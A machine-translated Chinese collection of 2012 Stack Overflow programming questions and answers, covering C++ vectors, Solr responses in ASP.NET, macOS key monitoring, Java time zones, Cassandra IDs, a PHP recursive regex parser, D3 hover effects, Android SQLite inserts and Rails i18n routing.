// Implementing the above methods to update the table view in response to individual changes may have performance implications if a large number of changes are made simultaneously. If this proves to be an issue, you can instead just implement controllerDidChangeContent: which notifies the delegate that all section and object changes have been processed. 

 - (void)controllerDidChangeContent:(NSFetchedResultsController *)controller
{
    // In the simplest, most efficient, case, reload the table view.
    [self.tableView reloadData];
}
 */

- (void)configureCell:(UITableViewCell *)cell atIndexPath:(NSIndexPath *)indexPath
{
    NSManagedObject *managedObject = [self.fetchedResultsController objectAtIndexPath:indexPath];
    cell.textLabel.text = [[managedObject valueForKey:@"timeStamp"] description];
}

- (void)insertNewObject
{
    // Create a new instance of the entity managed by the fetched results controller.
    NSManagedObjectContext *context = [self.fetchedResultsController managedObjectContext];
    NSEntityDescription *entity = [[self.fetchedResultsController fetchRequest] entity];
    NSManagedObject *newManagedObject = [NSEntityDescription insertNewObjectForEntityForName:[entity name] inManagedObjectContext:context];

    // If appropriate, configure the new managed object.
    // Normally you should use accessor methods, but using KVC here avoids the need to add a custom class to the template.
    [newManagedObject setValue:[NSDate date] forKey:@"timeStamp"];

    // Save the context.
    NSError *error = nil;
    if (![context save:&error]) {
        /*
         Replace this implementation with code to handle the error appropriately.

         abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
         */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }
}

@end 
```

代码结束:-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:12:13.763

您是否初始化了`NSMutableArray`init 函数之一？（在这种情况下，它可能是`initWithCoder`）

# c++ - 可以矢量图吗 不用new直接初始化？

> ID：10772549
> 
> 赞同：2
> 
> 时间：2012-05-27T08:06:40.463
> 
> 标签：c++, pointers, vector

我正在学习 C++/通用编程，有时在为旧标准编写的练习时尝试 C++11 功能。

这个练习涉及一个指向字符串的指针向量。

```
#include <vector>
#include <string>
#include <iostream>
int main()
{
    using std::string ;
    using std::vector ;
    using std::cout ;
    using std::endl ;

    vector<string *> v = {new string("Hello") , new string("World")} ;
    for (string * x : v) {
        cout << *x << " " ;
        delete x ;
    }
    cout << endl ;
} 
```

我很难弄清楚如何将初始化列表与这个向量一起使用，但这似乎可行。

此版本也适用：

```
 //...
    string s1 = "Hello" ;
    string s2 = "World" ;
    vector<string *> v = {&s1 , &s2} ;
    for (string * x : v)
        cout << *x << " " ;
    //... 
```

它看起来更干净，从我到目前为止所学到的知识来看，它似乎是更好的解决方案。

但我发现自己想知道：是否有其他方法可以初始化向量而无需提前创建字符串或不必使用删除？我读到的内容表明 {} 列表应该是通用的。

对于它的价值，这给出了一个相当灾难性的错误：

```
vector<string *> v = {"Hello" , "World"} ; 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-27T08:09:47.257

你为什么首先使用`std::string*`？你有什么理由吗？我不这么认为。

用这个：

```
std::vector<std::string> v{"Hello" , "World"}; 
```

现在，您不需要使用`new`. 此类类的设计正是因为您可以避免使用`new`自己。

另请注意，上面的初始化中没有`'='`中间`'v'`和`'{'`。这种初始化称为C++11 引入的*统一初始化。*[更多示例在这里](https://stackoverflow.com/a/10147335/415784)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T08:32:35.260

> 但我发现自己想知道：是否有其他方法可以初始化向量而无需提前创建字符串或不必使用删除？

不，要存储指向*某物*的指针，您必须将该某物存储在其他地方。否则将没有指针指向的地方。

感觉很奇怪可能是因为这*是*一种不寻常的字符串存储方式。如果这不是（人工）练习，您可以使用 a`std::vector<std::string>>` 并摆脱您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T08:34:39.573

就像 Nawaz 说的，为什么要麻烦使用指向字符串的指针呢？只是为了使用 -> 运算符？创建一个包含一些私有变量的类并使用引用返回它们。这是何时使用箭头运算符的更好示例。

# c# - 如何从 asp.net 中的 solr 搜索引擎获取 url 响应（内容：xml 数据）

> ID：10772550
> 
> 赞同：1
> 
> 时间：2012-05-27T08:06:53.217
> 
> 标签：c#, asp.net, solr

我的网址是：

```
http://localhost:8983/solr/db/select/?q=searchtext&version=2.2&start=0&rows=10&indent=on 
```

如何从 asp.net 中的此 url 获取响应（xml 数据）。我的搜索结果是：

```
WebRequest request = WebRequest.Create(url);
WebResponse response = request.GetResponse();
String a = response.ResponseUri.ToString(); 
```

但是，我无法获取 xml 数据的内容。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:15:37.353

```
HttpWebResponse response = (HttpWebResponse)request.GetResponse();

Stream receiveStream = response.GetResponseStream();

StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);

String a = readStream.ReadToEnd(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:13:33.573

ResponseUri 只是响应的 URL。您需要使用 GetResponseStream()。

您可能应该使用 XmlDocument 类。

[http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.aspx](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.aspx)

您的代码将如下所示：

```
 XmlDocument doc = new XmlDocument();
        doc.Load(response.GetResponseStream());
        string root = doc.DocumentElement.OuterXml; 
```

# macos - addGlobalMonitorForEventsMatchingMask 不捕获全局按键

> ID：10772552
> 
> 赞同：2
> 
> 时间：2012-05-27T08:07:13.923
> 
> 标签：macos, cocoa

我有一个**状态栏应用程序**。我正在使用此代码来捕获系统中非常用户的按键：

```
_keybordEventMonitor = 
[NSEvent addGlobalMonitorForEventsMatchingMask:(NSKeyDownMask) handler:^(NSEvent        *incomingEvent)
{
    [self inputKeyboardEventHandler: incomingEvent];
}]; 
```

它捕捉一切正常，但不捕捉全局系统热键，如`cmd`+`space`或`cmd`++ 。`shift``3`

可访问性 API 已启用。有任何想法吗？

PS：我尝试使用`CGEventTap`它，它有点工作，但有它自己的问题，因为我是一个可可菜鸟，我现在更喜欢保持简单。

# java - 特定时区的日历在 android 和 java 中不显示夏令时

> ID：10772554
> 
> 赞同：1
> 
> 时间：2012-05-27T08:07:35.827
> 
> 标签：java, android, timezone, dst

我无法获得特定时区的准确时间，例如“EST”，通常是 GMT-5，但现在它遵循夏令时，即 GMT-4。但在 java 和 android 中都显示了 1 小时的差异（它只需要 GMT-5，而不是 GMT-4）。但在点网中它显示正确。我的问题与[如何在 java 中使用 Timezone 处理夏令时](https://stackoverflow.com/questions/10545960/how-to-tackle-daylight-savings-using-timezone-in-java)相同 但我只能使用 TimeZone 的短形式，例如（“EST”、“IST”）。请您提供一些建议以根据特定的短格式时区获得准确的时间（如“EST”......）

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:27:41.107

对此没有完美的答案，因为您基本上得到的信息不完整。但是，这里有一些代码可以找到*所有*使用缩写“EST”的支持的时区（在非夏令时，在美国语言环境中）：

```
import java.util.*; 

public class Test {
  public static void main(String[] args) {
    for (TimeZone zone : getMatchingTimeZones("EST")) {
      System.out.println(zone.getID());
    }
  }

  public static List<TimeZone> getMatchingTimeZones(String target) {
    List<TimeZone> list = new ArrayList<TimeZone>();
    for (String id : TimeZone.getAvailableIDs()) {
      TimeZone zone = TimeZone.getTimeZone(id);
      String actual = zone.getDisplayName(false, TimeZone.SHORT, Locale.US);
      if (actual.equals(target)) {
        list.add(zone);
      }
    }
    return list;
  }
} 
```

如何从该列表到您想要的实际时区取决于您。（另外我不知道这是否适用于Android。我还没有尝试过。）

# nosql - 如何识别 cassandra / NoSQL 中的值？

> ID：10772557
> 
> 赞同：2
> 
> 时间：2012-05-27T08:08:10.850
> 
> 标签：nosql, cassandra

我正在使用 Cassandra 从 SQL 转到 NoSQL。

我读过[你真的需要 SQL 在 Cassandra 中完成所有工作吗？](http://maxgrinev.com/2010/07/12/do-you-really-need-sql-to-do-it-all-in-cassandra/). 这谈到了sql select，join，group by和order by，但是sql数据库中没有关于“id”概念的内容。在 SQL 中，所有值都有一个唯一标识符。

nosql/cassandra 有类似的东西吗？什么？`newId = lastId + 1`用 Cassandra 做类似或类似的事情是否安全？如何做？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:37:29.447

Cassandra 中不存在 ID。它是一个简单的键/值存储，您需要为您提供自己的文档 ID（称为键）。建议的方法是使用 UUID，它旨在避免键冲突。

做类似`newId = lastId + 1`的事情根本不安全。Cassandra 在设计上不支持事务，也无法使读写原子化。并发事务可能会使此失败：

*   进程 A 读取 10
*   进程 B 读取 10
*   进程 A 写入 10 + 1 = 11
*   进程 B 写入 10 + 1 = 11...哎呀，这应该是 12。

如果您有兴趣，[Cassandra Counters](http://wiki.apache.org/cassandra/Counters)会解决这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-05T12:22:13.250

如果您要从 SQL 转到 noSQL，另一个要考虑的选项是 playOrm

它像这样执行 Scalable JQL（注意添加了分区，但除此之外，SQL 是相同的）

```
@NoSqlQuery(name="findJoinOnNullPartition", query="PARTITIONS p(:partId) select p FROM TABLE as p INNER JOIN p.security as s where s.securityType = :type and p.numShares = :shares"), 
```

此外，它还会为您生成唯一的集群密钥，因此您不必总是处理密钥生成；）。playOrm 的密钥生成示例在这里（在一个集群中是唯一的）...

[https://github.com/deanhiller/playorm/blob/master/input/javasrc/com/alvazan/orm/api/base/spi/UniqueKeyGenerator.java](https://github.com/deanhiller/playorm/blob/master/input/javasrc/com/alvazan/orm/api/base/spi/UniqueKeyGenerator.java)

# php - 使用正则表达式编写 PHP 查询解析器

> ID：10772561
> 
> 赞同：1
> 
> 时间：2012-05-27T08:09:19.350
> 
> 标签：php, mysql, regex

我正在尝试在 PHP 中编写正确的正则表达式来解析字符串（由某些用户编写）来构建请求。它可能很复杂：

```
name = 'benjo' and (surname = 'benny' or surname = 'bennie') or age = 4 
```

稍后我将解析字符串以构建 mySQL 查询。现在，我只是想找到正确的正则表达式来将此字符串解析为一个可能如下所示的数组：

```
$result = array(
0 => name = 'benjo',
1 => and
2 => array(
    0 => surname = 'benny',
    1 => or,
    2 => surname = 'bennie',
    ),
3 => age = 4
); 
```

我考虑过使用递归函数，我现在的正则表达式是：

```
"#\((([^()]+|(?R))*)\)|(ou[^()])|(et[^()])#", 
```

这当然行不通。

如果有人可以提供帮助，我会很高兴，我有点卡在这里！:) Tks，罗曼

让我们改变挑战！:) 好的，现在让我们让它更简单一点。使用正则表达式并添加我们保持在“一级”的约束需要什么！没有嵌套括号，只有一个级别，但仍然有尽可能多的 AND/OR ......这会改变任何有利于或 REGEXP 的东西吗？（我真的很想避免编写我的迷你解析器，尽管这听起来很有趣......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:28:20.883

理论上的正则表达式不足以进行括号匹配。理论上的正则表达式只能处理左递归/右递归规则。中间递归规则不能用正则表达式表示（例如`<exp> -> "(" <exp> ")"`）。

然而，编程语言中的正则表达式实现了允许正则表达式超越常规语法的功能。例如，正则表达式中的反向引用允许编写匹配[非上下文无关语言](https://cstheory.stackexchange.com/questions/1047/where-do-most-regex-implementations-fall-on-the-complexity-scale)的正则表达式。但是，即使使用反向引用，仍然无法用正则表达式平衡括号。

由于 PCRE 库通过*子程序调用*功能支持递归正则表达式，因此在技术上可以使用正则表达式解析这样的表达式。但是，**除非您可以自己编写正则表达式**，这意味着您了解自己在做什么并且可以修改正则表达式以满足您的需要，**否则您应该编写自己的解析器**。否则，您最终将陷入无法维护的混乱局面。

```
(?(DEFINE)
  (?<string>'[^']++')
  (?<int>\b\d+\b)
  (?<sp>\s*)
  (?<key>\b\w+\b)
  (?<value>(?&string)|(?&int))
  (?<exp>(?&key) (?&sp) = (?&sp) (?&value))
  (?<logic>\b (?:and|or) \b)
  (?<main>
    (?<token> \( (?&sp) (?&main) (?&sp) \) | (?&exp) )
    (?:
      (?&sp) (?&logic) (?&sp)
      (?&token) 
    )*
  )
)
(?:
  ^ (?&sp) (?= (?&main) (?&sp) $ )
  |
  (?!^) \G
  (?&sp) (?&logic) (?&sp)
)
(?:
  \( (?&sp) (?<m_main>(?&main)) (?&sp) \)
  |
  (?<m_key>(?&key)) (?&sp) = (?&sp) (?<m_value>(?&value))
) 
```

[**正则表达式 101 上的演示**](https://regex101.com/r/xC2wK3/3)

上面的正则表达式应该与 , 一起使用`preg_match_all`，并放在带有 x 标志的分隔符之间（自由间距模式）`/.../x`：.

对于每场比赛：

*   如果`m_main`捕获组有内容，则对内容进行另一轮匹配。
*   否则，获取`m_key`和`m_value`捕获组中的键和值。

## 解释

该`(?(DEFINE)...)`块允许您定义命名的捕获组，以便在与主模式分开的子例程调用中使用。

```
(?(DEFINE)
  (?<string>'[^']++')  # String literal
  (?<int>\b\d+\b)      # Integer
  (?<sp>\s*)           # Whitespaces between tokens
  (?<key>\b\w+\b)      # Field name
  (?<value>(?&string)|(?&int)) # Field value
  (?<exp>(?&key) (?&sp) = (?&sp) (?&value)) # Simple expression
  (?<logic>\b (?:and|or) \b) # Logical operators
  (?<main>             # <token> ( <logic> <token> )*
    # A token can contain a simple expression, or open a parentheses (...)
    # When we open a parentheses, we recurse into the main pattern again
    (?<token> \( (?&sp) (?&main) (?&sp) \) | (?&exp) )
    (?:
      (?&sp) (?&logic) (?&sp)
      (?&token) 
    )*
  )
) 
```

该模式的其余部分[基于这种技术](https://stackoverflow.com/questions/15268504/collapse-and-capture-a-repeating-pattern-in-a-single-regex-expression/15418942#15418942)来匹配所有`<token>`s in`<token> ( <logic> <token> )*`与全局匹配操作。

正则表达式的最后一部分，虽然可以写成`(?&token)`，但被扩展以匹配简单表达式中的字段名称和值。

```
(?:
  \( (?&sp) (?<m_main>(?&main)) (?&sp) \)
  |
  (?<m_key>(?&key)) (?&sp) = (?&sp) (?<m_value>(?&value))
) 
```

# javascript - 这个漂亮的 D3.js 散点图高亮效果是如何实现的？

> ID：10772569
> 
> 赞同：4
> 
> 时间：2012-05-27T08:10:47.230
> 
> 标签：javascript, data-visualization, d3.js

当您将鼠标悬停在圆圈上时，我喜欢此散点图突出显示圆圈的方式：http: [//novus.github.com/nvd3/examples/scatterWithLegend.html](http://novus.github.com/nvd3/examples/scatterWithLegend.html)

但是那里有很多代码（看起来作者已经定义了他/她自己的标准库），我无法确切地弄清楚效果是如何实现的。

它与`.hover`班级和`stroke-width`财产有关吗？

我想在我自己的散点图上达到同样的效果，虽然我使用的是圆圈而不是路径，所以这可能是不可能的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T11:07:47.513

在示例中，效果似乎是从第 136 行开始在[scatter.js中实现的。](https://github.com/novus/nvd3/blob/master/src/models/scatter.js)

不过，仅突出显示单个圆圈要容易得多，并且不需要示例所做的所有其他内容。您需要做的就是`mouseover`向圆圈添加一个处理程序并（例如）增加`stroke-width`。那看起来像

```
d3.selectAll("circle").data(...).enter()
  .append(...)
  .classed("circle", true)
  .on("mouseover", function() { d3.select(d3.event.target).classed("highlight", true); })
  .on("mouseout", function() { d3.select(d3.event.target).classed("highlight", false); }); 
```

我假设一个 CSS 类`highlight`定义了样式。或者，您可以只使用（在此示例中）CSS 类`circle:hover`而不需要事件处理程序。

# android - Android - 加快在数据库中插入数据

> ID：10772578
> 
> 赞同：1
> 
> 时间：2012-05-27T08:12:59.693
> 
> 标签：android, database, sqlite, insert

我目前有一个我解析的 CSV 文件，并试图将数据插入到 android 数据库中。我遇到的问题是插入所有数据花费的时间太长。这是一个很好的数据量，但我觉得它不应该需要 20 分钟左右才能完成。

基本上，我创建了我的数据库，然后开始解析。在解析每个单独的 CSV 行时，我抓取所需的数据并将其插入到数据库中。总共有大约 40000 行。

有什么办法可以加快这个过程吗？我尝试过批量插入，但它从来没有真正帮助过（除非我做错了）。

代码如下。

谢谢。

**DatabaseHelper**（根据每个 csv 行中的数据量，我有两个插入命令）：

```
// add zipcode
    public void add9Zipcode(String zip, String city, String state, String lat,
            String longi, String decom) {

        // get db and content values
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues values = new ContentValues();

        db.beginTransaction();
        try{

            // add the values
            values.put(KEY_ZIP, zip);
            values.put(KEY_STATE, state);
            values.put(KEY_CITY, city);
            values.put(KEY_LAT, lat);
            values.put(KEY_LONG, longi);
            values.put(KEY_DECOM, decom);

            // execute the statement
            db.insert(TABLE_NAME, null, values);

            db.setTransactionSuccessful();
        } finally {
            db.endTransaction();
        }

        db.close();

    }

    public void add12Zipcode(String zip, String city, String state, String lat,
            String longi, String decom, String tax, String pop, String wages) {

        // get db and content values
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues values = new ContentValues();

        db.beginTransaction();
        try{
            // add the values
            values.put(KEY_ZIP, zip);
            values.put(KEY_STATE, state);
            values.put(KEY_CITY, city);
            values.put(KEY_LAT, lat);
            values.put(KEY_LONG, longi);
            values.put(KEY_DECOM, decom);
            values.put(KEY_TAX, tax);
            values.put(KEY_POP, pop);
            values.put(KEY_WAGES, wages);

            // execute the statement
            db.insert(TABLE_NAME, null, values);

            db.setTransactionSuccessful();
        } finally{
            db.endTransaction();  
        }

        db.close();
} 
```

**解析文件：**

```
public void parse(ArrayList<String> theArray, DatabaseHandler db) {

        String[] data = null;

        // while loop to get split the data into new lines
        // for loop to split each string in the array list of zipcodes
        for (int x = 0; x < theArray.size(); x++) {

            if(x == 10000 || x == 20000 || x == 30000 || x == 40000){
                Log.d(TAG, "x is 10k, 20k, 30k, 40k");
            }

            // split string first into an array
            data = theArray.get(x).split(",");

            // separate based on the size of the array: 9 or 12
            if (data.length == 9) {

                db.add9Zipcode(data[0], data[2], data[3], data[5], data[6],
                        data[8]);

            } else if (data.length == 12) {

                db.add12Zipcode(data[0], data[2], data[3], data[5], data[6],
                        data[8], data[9], data[10], data[11]);

                /*
                 * theZip.zip = data[0]; theZip.city = data[2]; theZip.state =
                 * data[3]; theZip.lat = data[5]; theZip.longi = data[6];
                 * theZip.decom = data[8]; theZip. = data[9]; theZip.population
                 * = data[10]; theZip.wages = data[11];
                 */

            }
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T08:16:40.547

参考我之前做的这个答案：[Inserting 1000000 rows in sqlite3 database](https://stackoverflow.com/a/10733844/967142)

简而言之，`InsertHelper`每个事务使用一个并且执行多个插入 - 除非您做了一些不可靠的事情，否则速度的提高应该是显而易见的。

**编辑：**
简而言之：

1.  您`SQLiteOpenHelper`应该是在整个应用程序中使用的单例。
2.  不要四处调用`close()`您的`SQLiteDatabase`实例 - 它被缓存在`SQLiteOpenHelper`每次关闭时，您都会强制帮助程序重新打开它。
3.  批量插入，在方法调用之外启动事务，`addZipCode`并在完成所有插入后将其标记为成功 - 然后提交事务。
4.  使用`InsertHelper`- 它会将插入正确格式化为准备好的语句，并且很好且可重用。
5.  请注意同步对数据库的访问 - 除非您打算在 UI 线程上完成所有数据库工作（不推荐） - 您需要启用锁定或保护对数据库的访问以避免并发访问。

# mono - 新手尝试在 MonoDevelop 中创建信号事件

> ID：10772580
> 
> 赞同：0
> 
> 时间：2012-05-27T08:13:30.127
> 
> 标签：mono, monodevelop

新手在这里，只是试图创建一个信号事件处理程序以响应 onclick 菜单项。不是为我工作。我单击菜单项，单击信号，在“已激活”右侧显示“单击以添加处理程序”，我输入“MyOnClick”然后它向我发出一个错误。诡异的。调用的目标已引发异常。

我在 macbook pro 上的 vm 下在 windows 7 中运行它。Windows 不从 Macbook Pro 共享文件夹，因此不应该是 UNC 问题。途径似乎很好。

有任何想法吗？

本

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-17T19:22:51.827

我在当前 monodevelop 版本的 mac 和 windows 上遇到了同样的问题。

> System.Reflection.TargetInvocationException：调用的目标已引发异常。---> System.NotImplementedException：方法或操作未实现。

这让我很烦！一定是什么bug。

编辑：我已经解决了！

在源代码中添加这样的方法：

```
 protected virtual void onClick (object sender, EventArgs e)
    {
        MessageDialog md = new MessageDialog (this, DialogFlags.Modal, 
MessageType.Error, ButtonsType.Close, "Some error"); 
        md.Response += delegate(object o, ResponseArgs args) { 
            if (args.ResponseId == ResponseType.Close) 
                Console.WriteLine ("Response: Closed");
            else 
                Console.WriteLine ("Other response happened."); 
        }; 
        md.Run (); 
        md.Destroy (); 
    } 
```

然后切换到可视化设计器，而不是双击信号/方法名称，只需输入方法名称 [本例] onClick（无括号）。这次实现了一个方法并且不会导致抛出错误。

它可以工作，但不如双击舒服。

# php - PHP MySQL 多图像 URL 字段数组

> ID：10772585
> 
> 赞同：0
> 
> 时间：2012-05-27T08:14:14.667
> 
> 标签：php, mysql

在为朋友建立网站时，数据库中有一行包含 39 个图像字段。在该字段中是图像的名称（例如“my_image.jpg”）而不是图像本身（BLOB）。即：image_01、image_02、image_03 等等。

我让 PHP 生成 while 循环并毫无问题地获取信息。我正在尝试将所有图像放入一个数组中，以便可以将该行中的图片显示为图库。

我希望有人可以为我提供前进的道路，因为我尝试过但没有成功。

从while循环：

```
$MEDIA_IMAGE_00 = $row["MEDIA_IMAGE_00"];
$MEDIA_IMAGE_01 = $row["MEDIA_IMAGE_01"];
$MEDIA_IMAGE_02 = $row["MEDIA_IMAGE_02"]; 
```

我需要回应

```
["propimages/$MEDIA_IMAGE_00", "", "", "$MEDIA_IMAGE_TEXT_00"],
["propimages/$MEDIA_IMAGE_01", "", "", "$MEDIA_IMAGE_TEXT_01"],
["propimages/$MEDIA_IMAGE_02", "", "", "$MEDIA_IMAGE_TEXT_02"] 
```

让他们在画廊中展示。

编辑：

```
while($row = mysql_fetch_array($sqlSearch)){ 
   $propid = $row["propid"];
   $MEDIA_IMAGE_00 = $row["MEDIA_IMAGE_00"];
   $MEDIA_IMAGE_01 = $row["MEDIA_IMAGE_01"];
   $MEDIA_IMAGE_02 = $row["MEDIA_IMAGE_02"];

   $MEDIA_IMAGE_33 = $row["MEDIA_IMAGE_33"];
   $MEDIA_IMAGE_34 = $row["MEDIA_IMAGE_34"];
   $MEDIA_IMAGE_35 = $row["MEDIA_IMAGE_35"];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:55:34.760

我假设这`$propid`是标识行本身的内容，并且“MEDIA_IMAGE_TEXT”在同一行中可用：

```
$properties = array();
while ($row = mysql_fetch_array($sqlSearch)) {
    $propid = $row["propid"];
    $images = array();
    for ($i = 0; $i <= 35; ++$i) {
        $imageId = "MEDIA_IMAGE_" . str_pad($i, 2, '0', STR_PAD_LEFT);
        if ($row[$imageId]) {
            $images[] = array(
                $row[$imageId],
                '',
                '',
                $row["MEDIA_IMAGE_TEXT_" . str_pad($i, 2, '0', STR_PAD_LEFT)],
            );
        }
    }
    $properties[] = array(
        'id' => $propid,
        'images' => $images,
    );

    echo json_encode($properties); 
```

它生成一个属性列表，每个属性都有一个 id 和一个图像数组；每张图片都包含位置（我猜）和标题/描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:17:42.433

为什么不在你的 while 循环中构建一个图像数组？

```
$images = array()

$i = 0;

While(...) {
$images[] = $row["MEDIA_IMAGE_0$i"];
$i++;
[...]
} 
```

你得到一个数组，你可以在 foreach 中使用并显示你的行。我认为按照应该可行的原则；）

# ruby-on-rails-3 - 使用 i18n 进行更新时，更新不会获取本地的值

> ID：10772589
> 
> 赞同：1
> 
> 时间：2012-05-27T08:15:08.497
> 
> 标签：ruby-on-rails-3, internationalization

我尝试在我的应用程序中使用 i18n 国际化。

当我进行显示（索引）、创建和编辑时，它工作得很好。我的问题是当我进行更新时。

当我按下更新按钮时，我没有得到 :locale 值

**通常我会恢复这些值。**

```
--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess
level: '5_3'
menu_item: '5'
menu_level: '5_3_1'
action: index
controller: communication_mails
locale: dk 
```

URL 如下所示：
localhost:3000/dk/communication_mails

当我按下编辑按钮时，我会恢复这些值。（“按钮”是一个链接）。语言环境还是可以的。

```
--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess
level: '5_3'
menu_item: '5'
menu_level: '5_3_2'
action: edit
controller: communication_mails
locale: dk
id: '2' 
```

URL 现在看起来像：localhost:3000/dk/communication_mails/2/edit

**我的问题是**，当我现在按下表单字段下的“更新”按钮时，重定向不会返回区域设置的值...而是使用 ID。

```
--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess
level: '5_3'
menu_item: '5'
menu_level: '5_3_1'
action: index
controller: communication_mails
locale: '2' 
```

URL 现在看起来像：localhost:3000/2/communication_mails

我的路线看起来像这样：

```
 scope "/:locale" do
    resources :communication_mails
  end

  resources :communication_mails do
    collection do
      get 'communication_mails'
      post 'communication_mails'
      put 'communication_mails'
    end
  end

  root :to => redirect("/dk/tests/")
  match '/communication_mails/:id/edit(.:format)', :to => 'communication_mails#edit'
  match '/communication_mails/:id/', :to => 'communication_mails#index'
  match '/communication_mails', :to => 'communication_mails#index' 
```

我的控制器是这样制作的。

```
 def edit
    @communication_mail = CommunicationMail.find(params[:id])
    @show_calendars = Calendar.where(:calendar_priority => '1')
    @show_email_text = CommunicationMail.find_by_sql("SELECT calendars.id,
    calendar_name, communication_mail_headline, communication_mail_text
    FROM calendars LEFT OUTER JOIN communication_mails 
    ON communication_mails.communication_mail_calendar_id = calendars.id
    WHERE communication_mails.communication_mail_priority = '1'")
  end

  def update
    @communication_mail = CommunicationMail.update(params[:id], params[:communication_mail])
    @show_calendars = Calendar.where(:calendar_priority => '1')
    @show_email_text = CommunicationMail.find_by_sql("SELECT calendars.id,
    calendar_name, communication_mail_headline, communication_mail_text
    FROM calendars LEFT OUTER JOIN communication_mails 
    ON communication_mails.communication_mail_calendar_id = calendars.id
    WHERE communication_mails.communication_mail_priority = '1'")
    if @communication_mail
      redirect_to communication_mails_path(:menu_item => '5', :level => '5_3', :menu_level => '5_3_1'), 
        :notice => 'Opdateringen af E-mail tekst lykkedes'
    else
      redirect_to communication_mails_path(:menu_item => '5', :level => '5_3', :menu_level => '5_3_1'), 
        :notice => 'Opdateringen af E-mail tekst lykkedes IKKE'
    end    
  end 
```

通过浏览这些页面，我解决了许多问题。但我找不到这个问题的答案。我希望有人可以帮助我。提前致谢。

更新

我的路线如下所示：

```
GET    /:locale/communication_mails/communication_mails(.:format)     communication_mails#communication_mails
POST   /:locale/communication_mails/communication_mails(.:format)      communication_mails#communication_mails
PUT    /:locale/communication_mails/communication_mails(.:format)  communication_mails#communication_mails
GET    /:locale/communication_mails(.:format)               communication_mails#index
POST   /:locale/communication_mails(.:format)               communication_mails#create
GET    /:locale/communication_mails/new(.:format)           communication_mails#new
GET    /:locale/communication_mails/:id/edit(.:format)      communication_mails#edit
GET    /:locale/communication_mails/:id(.:format)           communication_mails#show
PUT    /:locale/communication_mails/:id(.:format)           communication_mails#update
DELETE /:locale/communication_mails/:id(.:format)           communication_mails#destroy 
```

我用来发送和更新数据的表格

```
<%= form_for(@communication_mail) do |f| %>
  <table class="toggle_header2">
    <tr>
      <td class="nobr width50px font_size13 font_weight_bold color03 border_left">
        <%= t('forms.calendar') %> 
      </td>
      <td class="color03 border_right">      
        <%= collection_select(:communication_mail, 
          :communication_mail_calendar_id, 
          @show_calendars, 
          :id, 
          :calendar_name, 
          {:include_blank => true }, 
          {:prompt => true})
       %>
      </td>
    </tr>
    <tr>
      <td class="nobr width50px font_size13 font_weight_bold color03 border_left">
        <%= t('forms.headline') %>
      </td>
      <td class="color03 border_right">
        <%= f.text_field :communication_mail_headline, :class => 'width350px' %>
      </td>
    </tr>

    <tr>
      <td class="nobr align_top font_size13 font_weight_bold color03 border_left">
        <%= t('forms.text') %>
      </td>
      <td class="color03 border_right">
        <%= f.text_area :communication_mail_text, :class => 'width350px' %>
      </td>
    </tr>

    <tr>
      <td class="color03 border_left">
        <%= f.hidden_field :communication_mail_priority, :value => '1' %>
      </td>
      <td class="color03 border_right">
      <% if action_name == 'edit' || action_name == 'update'  %>
        <%= f.submit t('buttons.update') %> 
      <% else %>
        <%= f.submit t('buttons.insert') %> 
      <% end %>
      </td>
    </tr>
  </table>
<% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:24:42.560

如果您`:locale`从参数中选择您的值，那么您在路由中的方法不正确。

***更新：确保在更新操作时将 :locale 值传递给路由助手。***

此代码将生成仅适用于`index, show, new, create, edit, update, destroy`操作的路由。

```
scope "/:locale" do
  resources :communication_mails
end 
```

此代码将向 :communication_mails 添加其他路由，但没有范围。

```
 resources :communication_mails do
    collection do
      get 'communication_mails'
      post 'communication_mails'
      put 'communication_mails'
    end
  end 
```

解决方法是结合。您必须为所有`:communication_mails`操作定义 :scope 。

```
scope "/:locale" do
  resources :communication_mails do
    collection do
      get 'communication_mails'
      post 'communication_mails'
      put 'communication_mails'
    end
  end
end 
```

请阅读有关路由的文档（这是基础知识）： http: [//guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

# c# - ASP.Net 用户控件在运行时添加时不起作用

> ID：10772596
> 
> 赞同：0
> 
> 时间：2012-05-27T08:15:55.600
> 
> 标签：c#, asp.net, updatepanel

1.  我只是在 asp.net 中创建了一个用户控件，它有一个文本框、日历和一个按钮。
    1.  在该按钮的单击事件上，我使日历可见，并且在日历的`onselectionchanged`事件中，我将选定的日期传递给文本框。
    2.  现在我有一个 .aspx 页面，我在运行时添加了这个用户控件。
    3.  添加了用户控件，但是我使日历可见的按钮的单击事件没有被触发。

问题是什么？当我在设计时添加该用户控件时，它工作正常。但是当我在运行时添加它时不起作用。

<%@ Control Language="C#" AutoEventWireup="true" CodeFile="Dates.ascx.cs" Inherits="Date"%>

```
//created a public object named 'users' of control class
public partial class View_now : System.Web.UI.Page
{
public Control users;  
}

//loaded the user control in page load event
protected void Page_Load(object sender, EventArgs e)
{  
    users = LoadControl("~\\Dates.ascx");
}

//applied the user control to a panel
protected void Button2_Click(object sender, EventArgs e)
{
    Panel2.Controls.Add(users);
} 
```

